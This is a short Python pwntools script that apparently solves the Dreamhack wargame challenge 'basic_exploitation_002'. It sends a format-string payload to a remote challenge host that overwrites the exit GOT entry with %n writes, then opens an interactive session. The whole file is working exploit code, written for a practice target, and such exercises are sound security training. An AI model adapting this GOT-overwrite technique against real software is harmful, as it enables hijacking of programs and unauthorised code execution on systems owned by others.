from pwn import *


def main():
    elf = ELF("./basic_exploitation_002")
    exit_addr = elf.got["exit"]

    proc = remote("host1.dreamhack.games", 9396)

    payload = p32(exit_addr)
    payload += p32(exit_addr + 2)
    payload += b"%34305d"
    payload += b"%1$n"
    payload += b"%33275d"
    payload += b"%2$n"

    proc.sendline(payload)
    proc.interactive()


if __name__ == "__main__":
    main()
